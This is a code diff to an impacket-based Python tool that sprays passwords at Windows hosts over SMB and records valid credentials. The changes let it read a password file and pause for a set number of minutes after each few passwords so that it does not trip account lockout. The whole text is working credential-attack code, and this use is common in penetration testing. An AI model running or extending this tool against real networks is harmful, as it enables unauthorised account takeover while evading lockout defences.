@@ -1,5 +1,6 @@
 from impacket.dcerpc.v5 import transport, scmr
 from pebble import ProcessPool
+from datetime import datetime
 from impacket import version
 from time import sleep
 
@@ -19,6 +20,8 @@ color_reset = '\033[0m'
 green_plus = "{}[+]{}".format(color_GRE, color_reset)
 red_minus = "{}[-]{}".format(color_RED, color_reset)
 gold_plus = "{}[+]{}".format(color_YELL, color_reset)
+password_list = []
+
 
 def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan thigns we dont need to
     print('\n[scanning hosts]')
@@ -93,9 +96,9 @@ def sendit(username, password, domain, remoteName, remoteHost, hashes=None,aesKe
                     f.write('{} {}\n'.format(remoteName.ljust(20), upasscombo.ljust(30), "Valid Creds"))
                     f.close()
 
-def mt_execute(username, host_ip):  # multithreading requires a function
+def mt_execute(username, host_ip, passwd):  # multithreading requires a function
     try:
-        sendit(username, options.p, options.d, host_ip, host_ip, options.H, None, False, None, int(445))
+        sendit(username, passwd, options.d, host_ip, host_ip, options.H, None, False, None, int(445))
     except Exception as e:
         print(str(e))
         if options.o is not None:
@@ -115,8 +118,10 @@ if __name__ == '__main__':
     parser.add_argument('-H', action='store', help='Password hash to use LM:NT')
     parser.add_argument('-o', action='store', help='Output file')
     parser.add_argument('-s', action='store_true', default=False, help='Quiet mode will only print valid accounts')
+    parser.add_argument('-m', action='store', default=1, type=int, help='Max amount of passwords to try before pausing Default=1')
+    parser.add_argument('-pd', action='store', default=30, type=int, help='Duration to pause between the max amount of passwords (minutes) Default=30')
     parser.add_argument('-threads', action='store', default=1, type=int, help='Number of threads to use (Default=1)')
-    parser.add_argument('-delay', action='store', type=int, help='Number of seconds to wait between each account')
+    parser.add_argument('-delay', action='store', type=int, help='Number of seconds to wait between each account Default=NONE')
     parser.add_argument('target', action='store', help='IP to check the account against')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-method', action='store', choices=['random', 'sequence'], default='random',help='IP to check the account against')
@@ -148,6 +153,18 @@ if __name__ == '__main__':
     if options.H is not None:
         if options.H.find(':') == -1:
             options.H = ':' + options.H
+
+    if os.path.isfile(options.p): # check if password is a file of passwords
+        with open(options.p, 'r') as f:
+            unclean_passwords = f.readlines()
+            f.close()
+
+        for item in unclean_passwords: # sanatize passwords
+            item = item.replace('\n', '')
+            item = item.replace('\r', '')
+            password_list.append(item)
+    else:
+        password_list.append(options.p)
 
     if options.ip is not None:  # did they give us the local ip in the command line
         local_ip = options.ip
@@ -196,22 +213,40 @@ if __name__ == '__main__':
     else:
         users_cleaned.append(options.u)
 
-    if options.delay is not None:
-        options.threads = 1
+    if options.delay is not None: # so that the delay cannot exceed timeout
+        options.timeout = options.timeout + options.delay
+    count = 0
     if options.method == 'sequence':
         with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
             for curr_ip in addresses:
-                for username in users_cleaned:
-                    try:
-                        out = thread_exe.schedule(mt_execute, (username,curr_ip,), timeout=options.timeout)
-                    except Exception as e:
-                        print(str(e))
+                for password in password_list:
+                    for username in users_cleaned:
+                        try:
+                            out = thread_exe.schedule(mt_execute, (username,curr_ip,password,), timeout=options.timeout)
+                        except Exception as e:
+                            print(str(e))
+                    count += 1
+                    if count >= options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list)-1: # second part basically ensures that the current password's index does not equal the end of the array to prevent a sleep when there is no need
+                        count = 0
+                        sleep(10)
+                        currtime = datetime.now()
+                        print("Hit our max see you in {} mins from {}".format(options.pd, currtime.strftime("%H:%M:%S")))
+                        sleep(options.pd * 60)
+
 
     else:
         with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
-            for username in users_cleaned:
-                curr_ip = addresses[random.randint(0, len(addresses)-1)]
-                try:
-                    out = thread_exe.schedule(mt_execute, (username,curr_ip,), timeout=options.timeout)
-                except Exception as e:
-                    print(str(e))
+            for password in password_list:
+                for username in users_cleaned:
+                    curr_ip = addresses[random.randint(0, len(addresses)-1)]
+                    try:
+                        out = thread_exe.schedule(mt_execute, (username,curr_ip,password,), timeout=options.timeout)
+                    except Exception as e:
+                        print(str(e))
+                count += 1
+                if count >= options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list)-1:
+                    count = 0
+                    sleep(10)
+                    currtime = datetime.now()
+                    print("Hit our max see you in {} mins from {}".format(options.pd, currtime.strftime("%H:%M:%S")))
+                    sleep(options.pd * 60)
